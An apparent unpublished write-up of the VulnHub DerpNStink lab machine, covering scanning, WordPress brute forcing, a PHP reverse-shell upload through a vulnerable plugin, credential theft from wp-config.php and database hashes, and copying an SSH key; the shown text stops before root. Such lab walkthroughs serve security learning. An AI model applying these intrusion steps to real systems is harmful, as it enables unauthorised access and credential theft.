---
published: false
---
**URL:** [DerpNStink](https://www.vulnhub.com/entry/derpnstink-1,221/)

**Difficulty:** Beginner

**Author:** Bryan Smith

### Enumeration

Set up the Machine with a host-only adapter and run a net discover command to find the associated IP. My interface eth1 is Host Only on my main OS (Kali Linux).

<pre>netdiscover -i eth1</pre>

![net](https://imgur.com/FMu22dc.png)

The IP 192.168.56.103 has been found so we will do a port scan with the following IP:

<pre>nmap -sS -A -p- -o "nmap" 192.168.56.103</pre>

![nmap](nmap -sS -A -p- -o nmap 192.168.56.103)

The first port that is open is the FTP. Sometimes users can log in as Anonymous with no password needed. 

<pre>ftp 192.168.56.103
Anonymous</pre>

![ftp](https://imgur.com/6lgyL35.png)

This was not possible so I will move onto enumerating the next port.

Port 80 is open so have a look on a browser. This is what the web page looks like:

![web](https://i.imgur.com/35zMoqV.png)

Nothing obvious sticks out so look at the source code.

![source](https://imgur.com/eWpQyFN.png)

There is an interesting link worth checking in one of the < script > tags as shown below. There is a link to /webnotes/info.txt. Go to that directory.

![info](https://imgur.com/h4EluwO.png)

There is a message to "stinky" (as possible user) to update the local hosts file with a local dns so the blog website can be accessed. There was no blog seen initially so let's go ahead and update our host file on our local machine. Before this, I want to just double check what else we can find at /webnotes. This is a snippet of what is found:

![webnotes](https://imgur.com/S3bqGZK.png)

A username stinky@DeRPnStiNK is mentioned. This is worth noting. There was also a mention of a robots.txt file in the nmap scan so let's have a look at that as well:

![robots](https://imgur.com/0Co5GVQ.png)

Paths /php and /temporary are listed in this. Let's check them out:

![phptemp](https://imgur.com/NaQDqrv.png)

This seems to be a rabbit hole. Nothing to see here. Now let's continue to updating our hosts file.

A hosts file is a plain text file that all operating systems use to translate hostnames into IP addresses. You can read more about this [here](https://vitux.com/linux-hosts-file/).

Edit the /etc/hosts file with gedit or nano.

<pre>nano /etc/hosts</pre>

Add the machines IP address to a hostname.

<pre>192.168.56.103 derpnstink.local</pre>

This should now be accessible. You can visit the webpage and enumerate this further.

Use dirb (Web Content Scanner) to find more paths to this website to hopefully find the blog the users have been talking about.

<pre>dirb http://derpnstink.local/</pre>

![dirb](https://imgur.com/4jMsWGK.png)

Visit the link and there is a blog. According to the dirb results, there seems to be WordPress running. This is a snippet of my results:

![dirbsnip](https://imgur.com/SBIVNDJ.png)

Wordpress is one of the most popular website making tools which attracts lots of hackers. Let's use the popular Wordpress Vulnerability scanner WPScan. Here is a link to their [website](https://github.com/wpscanteam/wpscan). 

Kali Linux should already have this installed so I will be executing the following command:

<pre>wpscan --url http://derpnstink.local/weblog/ -e u,vp,vt</pre>

-e refers to the enumeration option. u,vp and vt means the scan will be looking for users, vulnerable plugins and vulnerable themes.

![wpscan](https://imgur.com/BpqnfvM.png)

Some users have evidently been found: unclestinky and admin.

All the exploits given by WPScan seem to be authenticated which is not yet possible so we will look for a way to gain user access. 

I will try bruteforcing since WPScan has an option for bruting passwords. This is the command:

<pre>wpscan --url http://derpnstink.local/weblog/ --passwords /usr/share/wordlists/rockyou.txt --username { user } </pre>

I have used the --passwords option to indicate a brute forcing session. I have given a path to a passwords list and will provide a username after the --username parameter. I first tried unclestinky then admin.

After some time there was no results. I tried the default admin credentials which gave a successful login. For some reason the rockyou.txt file didn't contain "admin".

### User

Now that we have authenticated access, we can use an exploit given in the WPScan results. This exploit is ideal.

[Expoloit DB](https://www.exploit-db.com/exploits/34514)

No need to use the code. Just create a php payload to upload on the vulnerable slideshow vulnerability. There is a premade php backdoor under the webshells directory on kali linux.

![payload](https://imgur.com/QM2KDEB.png)

I copied this in my current directory with the following command:

<pre>locate webshells
cp /usr/share/webshells/php/php-reverse-shell.php .</pre>

Edit the payload accordingly. Add your local IP address and a port you will be listening on.

<pre>nano php-reverse-shell.php</pre>

![edit](https://imgur.com/u6sguJx.png)

This is ready to upload to the slideshow plugin on Wordpress. Go to the WP web interface > slideshow and add your own slide show.

Add in some information into the fields and upload your payload under "Choose Image". Save the changes.

![upload](https://imgur.com/lK6wqw9.png)

Before executing the payload, we need to listen on the chosen port. Set up a netcat session and listen on your specified port.

<pre>nc -nvlp 4444</pre>

Everything should be ready. Simply click on the slideshow you have just created to execute the payload. You can do this from the main "slideshow" page. 

![session](https://imgur.com/j18SPM2.png)

We have a reverse shell!

### Root

Now we are aiming to gain root privileges.

<pre>id
pwd</pre>

We have a reverse shell with "www-data". Upgrade the shell:

<pre>python3 -c 'import pty;pty.spawn("/bin/bash")'</pre>

In order to see other users on this system, we can have a look at /etc/passwd or simply look at the home directories in /home.

<pre>cd /home</pre>

![home](https://imgur.com/8clxvpp.png)

There are 2 users, mrderp and stinky. Looking into stinky's home directory, we find a pastebin link: https://pastebin.com/RzK9WfGw 

<pre>mrderp ALL=(ALL) /home/mrderp/binaries/derpy*</pre>

This is the sudo privileges that mrderp has. We need to get access to his account to exploit this. 

If you are not familiar with Wordpress, credentials are kept in plaintext on a wordpress configuration file named wp-config.php. Search for this file and look at the contents using cat. 

<pre>locate wp-config.php
cat /path/to/wp-config.php</pre>

A look at this file gives us some credentials.

![locate](https://imgur.com/vdRCG0b.png)

These credentials are for the database. Let's try these out. Go to /php/phpmyadmin.

![db](https://imgur.com/TbpjMMp.png)

The login was successful.

![dblogin](https://i.imgur.com/3m4wwvC.png)

Earlier on when we scanned the Wordpress website, there was another user account. Let's go to the Wordpress database and change the password to something we know so we can log into that account.

Go to wordpress > wp_users

As we know the password for the admin account, copy and paste the hash into unclestinky's password field.

![change hash](https://imgur.com/h4xxoOM.png)

Now login into stinky's account and see if we can find any more information.

![wp login](https://imgur.com/j3FXp41.png)

There isn't much to see here except for another flag under the posts section:

![flag](https://imgur.com/zirWTLf.png)

Let's move onto other credentials. We are done with Wordpress. Going back to the phpmyadmin database, go to mysql > user for some hash passwords. We can crack some of these ourselves with John or just search them up. 

![hash](https://imgur.com/JPnYIun.png)

I have used this website to try and find a password for unclestinky / derpnstink@local:

[Crack Station](https://crackstation.net/)

![cracked](https://i.imgur.com/EBCiugT.png)

<pre>*9B776AFB479B31E8047026F1185E952DD1E530CB : wedgie57</pre>

The password wedgie57 has been found. Let's attempt to change the user to stinky with su using the password we found.

<pre>su stinky</pre>

![su](https://i.imgur.com/ezbPd8w.png)

There is another flag in the Desktop directory of stinky.

<pre>cd stinky/Desktop
ls -la
cat flag.txt</pre>

![flag](https://i.imgur.com/ffpD0Bm.png)

Under the ftp/files/network-logs directory, there is a snapshot of a conversation between mrderp and stinky. There is a mention of a packet capture which is important as there may be a password in plaintext in there.

![convo](https://imgur.com/IY6PdD9.png)

There is also an ssh directory under ftp. If you keep going into the ssh directories, there is a txt file named key. This is a RSA Private key. Read more about it [here](https://www.namecheap.com/support/knowledgebase/article.aspx/798/67/what-is-an-rsa-key-used-for). It is often used as a 'key' when connecting to a server via ssh. 

![ssh](https://imgur.com/RQfxhlx.png)

In order to ssh with a private key, copy this key over to your local machine.

<pre>nano ssh
-paste key-
Ctl+x, y, Enter.</pre>

![nano](https://i.imgur.com/2h7jB0c.png)

Before using this as a key, change the permissions by executing the following command:

<pre>chmod 700 ssh</pre>

